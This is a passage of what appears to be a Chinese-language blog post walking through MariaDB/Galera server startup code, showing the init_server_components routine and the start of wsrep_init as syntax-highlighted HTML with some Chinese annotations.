(opt_log_slave_updates &amp;&amp; replicate_same_server_id)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (opt_bin_log)</span><br><span class="line">    &#123;</span><br><span class="line">      sql_print_error(<span class="string">"using --replicate-same-server-id in conjunction with "</span></span><br><span class="line">                      <span class="string">"--log-slave-updates is impossible, it would lead to "</span></span><br><span class="line">                      <span class="string">"infinite loops in this server."</span>);</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sql_print_warning(<span class="string">"using --replicate-same-server-id in conjunction with "</span></span><br><span class="line">                        <span class="string">"--log-slave-updates would lead to infinite loops in "</span></span><br><span class="line">                        <span class="string">"this server. However this will be ignored as the "</span></span><br><span class="line">                        <span class="string">"--log-bin option is not defined."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt_bin_log)  <span class="comment">//binlog日志打开？</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Reports an error and aborts, if the --log-bin's path </span></span><br><span class="line"><span class="comment">       is a directory.*/</span></span><br><span class="line">    <span class="keyword">if</span> (opt_bin_logname[<span class="number">0</span>] &amp;&amp; </span><br><span class="line">        opt_bin_logname[<span class="built_in">strlen</span>(opt_bin_logname) - <span class="number">1</span>] == FN_LIBCHAR)</span><br><span class="line">    &#123;</span><br><span class="line">      sql_print_error(<span class="string">"Path '%s' is a directory name, please specify "</span></span><br><span class="line">                      <span class="string">"a file name for --log-bin option"</span>, opt_bin_logname);</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Reports an error and aborts, if the --log-bin-index's path </span></span><br><span class="line"><span class="comment">       is a directory.*/</span></span><br><span class="line">    <span class="keyword">if</span> (opt_binlog_index_name &amp;&amp; </span><br><span class="line">        opt_binlog_index_name[<span class="built_in">strlen</span>(opt_binlog_index_name) - <span class="number">1</span>] </span><br><span class="line">        == FN_LIBCHAR)</span><br><span class="line">    &#123;</span><br><span class="line">      sql_print_error(<span class="string">"Path '%s' is a directory name, please specify "</span></span><br><span class="line">                      <span class="string">"a file name for --log-bin-index option"</span>,</span><br><span class="line">                      opt_binlog_index_name);</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[FN_REFLEN];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *ln;</span><br><span class="line">    ln= mysql_bin_log.generate_name(opt_bin_logname, <span class="string">"-bin"</span>, <span class="number">1</span>, buf);</span><br><span class="line">    <span class="keyword">if</span> (!opt_bin_logname[<span class="number">0</span>] &amp;&amp; !opt_binlog_index_name)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        User didn't give us info to name the binlog index file.</span></span><br><span class="line"><span class="comment">        Picking `hostname`-bin.index like did in 4.x, causes replication to</span></span><br><span class="line"><span class="comment">        fail if the hostname is changed later. So, we would like to instead</span></span><br><span class="line"><span class="comment">        require a name. But as we don't want to break many existing setups, we</span></span><br><span class="line"><span class="comment">        only give warning, not error.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      sql_print_warning(<span class="string">"No argument was provided to --log-bin and "</span></span><br><span class="line">                        <span class="string">"neither --log-basename or --log-bin-index where "</span></span><br><span class="line">                        <span class="string">"used;  This may cause repliction to break when this "</span></span><br><span class="line">                        <span class="string">"server acts as a master and has its hostname "</span></span><br><span class="line">                        <span class="string">"changed! Please use '--log-basename=%s' or "</span></span><br><span class="line">                        <span class="string">"'--log-bin=%s' to avoid this problem."</span>,</span><br><span class="line">                        opt_log_basename, ln);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ln == buf)</span><br><span class="line">      opt_bin_logname= my_once_strdup(buf, MYF(MY_WME));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Wsrep initialization must happen at this point, because:</span></span><br><span class="line"><span class="comment">    - opt_bin_logname must be known when starting replication</span></span><br><span class="line"><span class="comment">      since SST may need it</span></span><br><span class="line"><span class="comment">    - SST may modify binlog index file, so it must be opened</span></span><br><span class="line"><span class="comment">      after SST has happened</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    We also (unconditionally) initialize wsrep LOCKs and CONDs.</span></span><br><span class="line"><span class="comment">    It is because they are used while accessing wsrep system</span></span><br><span class="line"><span class="comment">    variables even when a wsrep provider is not loaded.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  wsrep_thr_init();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WSREP_ON &amp;&amp; !wsrep_recovery &amp;&amp; !opt_abort) <span class="comment">/* WSREP BEFORE SE */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (opt_bootstrap) <span class="comment">// bootsrap option given - disable wsrep functionality</span></span><br><span class="line">    &#123;</span><br><span class="line">      wsrep_provider_init(WSREP_NONE);   <span class="comment">//节点初始化</span></span><br><span class="line">      <span class="keyword">if</span> (wsrep_init())  <span class="comment">//初始化数据结构和回调函数</span></span><br><span class="line">        unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// full wsrep initialization</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// add basedir/bin to PATH to resolve wsrep script names</span></span><br><span class="line">      <span class="keyword">char</span>* <span class="keyword">const</span> tmp_path= (<span class="keyword">char</span>*)my_alloca(<span class="built_in">strlen</span>(mysql_home) +</span><br><span class="line">                                             <span class="built_in">strlen</span>(<span class="string">"/bin"</span>) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (tmp_path)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(tmp_path, mysql_home);</span><br><span class="line">        <span class="built_in">strcat</span>(tmp_path, <span class="string">"/bin"</span>);</span><br><span class="line">        wsrep_prepend_PATH(tmp_path);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        WSREP_ERROR(<span class="string">"Could not append %s/bin to PATH"</span>, mysql_home);</span><br><span class="line">      &#125;</span><br><span class="line">      my_afree(tmp_path);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wsrep_before_SE())</span><br><span class="line">      &#123;</span><br><span class="line">        set_ports(); <span class="comment">// this is also called in network_init() later but we need</span></span><br><span class="line">                     <span class="comment">// to know mysqld_port now - lp:1071882</span></span><br><span class="line">        wsrep_init_startup(<span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt_bin_log) <span class="comment">//如果binlog打开，打开索引文件</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (mysql_bin_log.open_index_file(opt_binlog_index_name, opt_bin_logname,</span><br><span class="line">                                      TRUE))</span><br><span class="line">    &#123;</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt_bin_log)</span><br><span class="line">  &#123;</span><br><span class="line">    log_bin_basename=</span><br><span class="line">      rpl_make_log_name(opt_bin_logname, pidfile_name,</span><br><span class="line">                        opt_bin_logname ? <span class="string">""</span> : <span class="string">"-bin"</span>);</span><br><span class="line">    log_bin_index=</span><br><span class="line">      rpl_make_log_name(opt_binlog_index_name, log_bin_basename, <span class="string">".index"</span>);</span><br><span class="line">    <span class="keyword">if</span> (log_bin_basename == <span class="literal">NULL</span> || log_bin_index == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      sql_print_error(<span class="string">"Unable to create replication path names:"</span></span><br><span class="line">                      <span class="string">" out of memory or path names too long"</span></span><br><span class="line">                      <span class="string">" (path name exceeds "</span> STRINGIFY_ARG(FN_REFLEN)</span><br><span class="line">                      <span class="string">" or file name exceeds "</span> STRINGIFY_ARG(FN_LEN) <span class="string">")."</span>);</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EMBEDDED_LIBRARY</span></span><br><span class="line">  DBUG_PRINT(<span class="string">"debug"</span>,</span><br><span class="line">             (<span class="string">"opt_bin_logname: %s, opt_relay_logname: %s, pidfile_name: %s"</span>,</span><br><span class="line">              opt_bin_logname, opt_relay_logname, pidfile_name));</span><br><span class="line">  <span class="keyword">if</span> (opt_relay_logname)</span><br><span class="line">  &#123;</span><br><span class="line">    relay_log_basename=</span><br><span class="line">      rpl_make_log_name(opt_relay_logname, pidfile_name,</span><br><span class="line">                        opt_relay_logname ? <span class="string">""</span> : <span class="string">"-relay-bin"</span>);</span><br><span class="line">    relay_log_index=</span><br><span class="line">      rpl_make_log_name(opt_relaylog_index_name, relay_log_basename, <span class="string">".index"</span>);</span><br><span class="line">    <span class="keyword">if</span> (relay_log_basename == <span class="literal">NULL</span> || relay_log_index == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      sql_print_error(<span class="string">"Unable to create replication path names:"</span></span><br><span class="line">                      <span class="string">" out of memory or path names too long"</span></span><br><span class="line">                      <span class="string">" (path name exceeds "</span> STRINGIFY_ARG(FN_REFLEN)</span><br><span class="line">                      <span class="string">" or file name exceeds "</span> STRINGIFY_ARG(FN_LEN) <span class="string">")."</span>);</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !EMBEDDED_LIBRARY */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* call ha_init_key_cache() on all key caches to init them */</span></span><br><span class="line">  process_key_caches(&amp;ha_init_key_cache, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  init_global_table_stats(); <span class="comment">//初始化全局表统计</span></span><br><span class="line">  init_global_index_stats();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allow storage engine to give real error messages */</span></span><br><span class="line">  <span class="keyword">if</span> (ha_init_errors())</span><br><span class="line">    DBUG_RETURN(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  tc_log= <span class="number">0</span>; <span class="comment">// ha_initialize_handlerton() needs that</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (plugin_init(&amp;remaining_argc, remaining_argv,</span><br><span class="line">                  (opt_noacl ? PLUGIN_INIT_SKIP_PLUGIN_TABLE : <span class="number">0</span>) |</span><br><span class="line">                  (opt_abort ? PLUGIN_INIT_SKIP_INITIALIZATION : <span class="number">0</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">    sql_print_error(<span class="string">"Failed to initialize plugins."</span>);</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  plugins_are_initialized= TRUE;  <span class="comment">/* Don't separate from init function */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* we do want to exit if there are any other unknown options */</span></span><br><span class="line">  <span class="keyword">if</span> (remaining_argc &gt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> ho_error;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_option</span> <span class="title">no_opts</span>[]=</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, GET_NO_ARG, NO_ARG, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We need to eat any 'loose' arguments first before we conclude</span></span><br><span class="line"><span class="comment">      that there are unprocessed options.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    my_getopt_skip_unknown= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ho_error= handle_options(&amp;remaining_argc, &amp;remaining_argv, no_opts,</span><br><span class="line">                                  mysqld_get_one_option)))</span><br><span class="line">      unireg_abort(ho_error);</span><br><span class="line">    <span class="comment">/* Add back the program name handle_options removes */</span></span><br><span class="line">    remaining_argc++;</span><br><span class="line">    remaining_argv--;</span><br><span class="line">    my_getopt_skip_unknown= TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (remaining_argc &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s: Too many arguments (first extra is '%s').\n"</span>,</span><br><span class="line">              my_progname, remaining_argv[<span class="number">1</span>]);</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (init_io_cache_encryption())</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt_abort)</span><br><span class="line">    unireg_abort(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* if the errmsg.sys is not loaded, terminate to maintain behaviour */</span></span><br><span class="line">  <span class="keyword">if</span> (!DEFAULT_ERRMSGS[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    unireg_abort(<span class="number">1</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have to initialize the storage engines before CSV logging */</span></span><br><span class="line">  <span class="keyword">if</span> (ha_init())</span><br><span class="line">  &#123;</span><br><span class="line">    sql_print_error(<span class="string">"Can't init databases"</span>);</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt_bootstrap)</span><br><span class="line">    log_output_options= LOG_FILE;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    logger.init_log_tables();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (log_output_options &amp; LOG_NONE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Issue a warining if there were specified additional options to the</span></span><br><span class="line"><span class="comment">      log-output along with NONE. Probably this wasn't what user wanted.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ((log_output_options &amp; LOG_NONE) &amp;&amp; (log_output_options &amp; ~LOG_NONE))</span><br><span class="line">      sql_print_warning(<span class="string">"There were other values specified to "</span></span><br><span class="line">                        <span class="string">"log-output besides NONE. Disabling slow "</span></span><br><span class="line">                        <span class="string">"and general logs anyway."</span>);</span><br><span class="line">    logger.set_handlers(LOG_FILE, LOG_NONE, LOG_NONE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* fall back to the log files if tables are not present */</span></span><br><span class="line">    LEX_STRING csv_name=&#123;C_STRING_WITH_LEN(<span class="string">"csv"</span>)&#125;;</span><br><span class="line">    <span class="keyword">if</span> (!plugin_is_ready(&amp;csv_name, MYSQL_STORAGE_ENGINE_PLUGIN))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* purecov: begin inspected */</span></span><br><span class="line">      sql_print_error(<span class="string">"CSV engine is not present, falling back to the "</span></span><br><span class="line">                      <span class="string">"log files"</span>);</span><br><span class="line">      SYSVAR_AUTOSIZE(log_output_options, </span><br><span class="line">                      (log_output_options &amp; ~LOG_TABLE) | LOG_FILE);</span><br><span class="line">      <span class="comment">/* purecov: end */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.set_handlers(LOG_FILE,</span><br><span class="line">                        global_system_variables.sql_log_slow ?</span><br><span class="line">                        log_output_options:LOG_NONE,</span><br><span class="line">                        opt_log ? log_output_options:LOG_NONE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (init_default_storage_engine(default_storage_engine, table_plugin))</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (default_tmp_storage_engine &amp;&amp; !*default_tmp_storage_engine)</span><br><span class="line">    default_tmp_storage_engine= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (enforced_storage_engine &amp;&amp; !*enforced_storage_engine)</span><br><span class="line">    enforced_storage_engine= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (init_default_storage_engine(default_tmp_storage_engine, tmp_table_plugin))</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (init_default_storage_engine(enforced_storage_engine, enforced_table_plugin))</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_ARIA_FOR_TMP_TABLES</span></span><br><span class="line">  <span class="keyword">if</span> (!ha_storage_engine_is_enabled(maria_hton) &amp;&amp; !opt_bootstrap)</span><br><span class="line">  &#123;</span><br><span class="line">    sql_print_error(<span class="string">"Aria engine is not enabled or did not start. The Aria engine must be enabled to continue as mysqld was configured with --with-aria-tmp-tables"</span>);</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WITH_WSREP</span></span><br><span class="line">  <span class="keyword">if</span> (WSREP_ON &amp;&amp; !opt_bin_log)</span><br><span class="line">  &#123;</span><br><span class="line">    wsrep_emulate_bin_log= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  tc_log= get_tc_log_implementation();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tc_log-&gt;<span class="built_in">open</span>(opt_bin_log ? opt_bin_logname : opt_tc_log_file))</span><br><span class="line">  &#123;</span><br><span class="line">    sql_print_error(<span class="string">"Can't init tc log"</span>);</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ha_recover(<span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    unireg_abort(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt_bin_log)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * mutex lock is not needed here.</span></span><br><span class="line"><span class="comment">     * but to be able to have mysql_mutex_assert_owner() in code,</span></span><br><span class="line"><span class="comment">     * we do it anyway */</span></span><br><span class="line">    mysql_mutex_lock(mysql_bin_log.get_log_lock());</span><br><span class="line">    <span class="keyword">int</span> r= mysql_bin_log.<span class="built_in">open</span>(opt_bin_logname, LOG_BIN, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                              WRITE_CACHE, max_binlog_size, <span class="number">0</span>, TRUE);</span><br><span class="line">    mysql_mutex_unlock(mysql_bin_log.get_log_lock());</span><br><span class="line">    <span class="keyword">if</span> (r)</span><br><span class="line">      unireg_abort(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_REPLICATION</span></span><br><span class="line">  <span class="keyword">if</span> (opt_bin_log &amp;&amp; expire_logs_days)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">time_t</span> purge_time= server_start_time - expire_logs_days*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>;</span><br><span class="line">    <span class="keyword">if</span> (purge_time &gt;= <span class="number">0</span>)</span><br><span class="line">      mysql_bin_log.purge_logs_before_date(purge_time);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt_myisam_log)</span><br><span class="line">    (<span class="keyword">void</span>) mi_log(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(HAVE_MLOCKALL) &amp;&amp; defined(MCL_CURRENT) &amp;&amp; !defined(EMBEDDED_LIBRARY)</span></span><br><span class="line">  <span class="keyword">if</span> (locked_in_memory)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> error;</span><br><span class="line">    <span class="keyword">if</span> (user_info)</span><br><span class="line">    &#123;</span><br><span class="line">      DBUG_ASSERT(!getuid());</span><br><span class="line">      <span class="keyword">if</span> (setreuid((<span class="keyword">uid_t</span>) <span class="number">-1</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        sql_perror(<span class="string">"setreuid"</span>);</span><br><span class="line">        unireg_abort(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      error= mlockall(MCL_CURRENT);</span><br><span class="line">      set_user(mysqld_user, user_info);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      error= mlockall(MCL_CURRENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (global_system_variables.log_warnings)</span><br><span class="line">sql_print_warning(<span class="string">"Failed to lock memory. Errno: %d\n"</span>,errno);</span><br><span class="line">      locked_in_memory= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  locked_in_memory= <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  ft_init_stopwords();</span><br><span class="line"></span><br><span class="line">  init_max_user_conn();  <span class="comment">//初始化最大用户链接数目</span></span><br><span class="line">  init_update_queries(); <span class="comment">// 初始化update queries</span></span><br><span class="line">  init_global_user_stats();</span><br><span class="line">  init_global_client_stats();</span><br><span class="line">  <span class="keyword">if</span> (!opt_bootstrap)</span><br><span class="line">    servers_init(<span class="number">0</span>);</span><br><span class="line">  init_status_vars();</span><br><span class="line">  DBUG_RETURN(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wsrep_init初始化：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wsrep_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rcode= <span class="number">-1</span>;</span><br><span class="line">  DBUG_ASSERT(wsrep_inited == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(wsrep_start_position, WSREP_START_POSITION_ZERO))</span><br><span class="line">    wsrep_start_position_init(wsrep_start_position);  <span class="comment">//初始化启动位置，扫描uuid和seqno</span></span><br><span class="line"></span><br><span class="line">  wsrep_sst_auth_init(wsrep_sst_auth);  <span class="comment">// 同步数据认证</span></span><br><span class="line"></span><br><span class="line">  wsrep_causal_reads_update(&amp;global_system_variables); <span class="comment">// wsrep_sync_wait状态更新</span></span><br><span class="line"></span><br><span class="line">  wsrep_ready_set(FALSE);</span><br><span class="line">  assert(wsrep_provider);</span><br><span class="line"></span><br><span class="line">  wsrep_init_position();  <span class="comment">//根据获取到的uuid和seqno启动位置</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rcode= wsrep_load(wsrep_provider, &amp;wsrep, wsrep_log_cb)) != WSREP_OK)  <span class="comment">//wsrep_provider加载</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(wsrep_provider, WSREP_NONE))</span><br><span class="line">    &#123;</span><br><span class="line">      WSREP_ERROR(<span class="string">"wsrep_load(%s) failed: %s (%d). Reverting to no provider."</span>,</span><br><span class="line">                  wsrep_provider, strerror(rcode), rcode);</span><br><span class="line">      <span class="built_in">strcpy</span>((<span class="keyword">char</span>*)wsrep_provider, WSREP_NONE); <span class="comment">// damn it's a dirty hack</span></span><br><span class="line">      (<span class="keyword">void</span>) wsrep_init();</span><br><span class="line">      <span class="keyword">return</span> rcode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">/* this is for recursive call above */</span></span><br><span class="line">    &#123;</span><br><span class="line">      WSREP_ERROR(<span class="string">"Could not revert to no provider: %s (%d). Need to 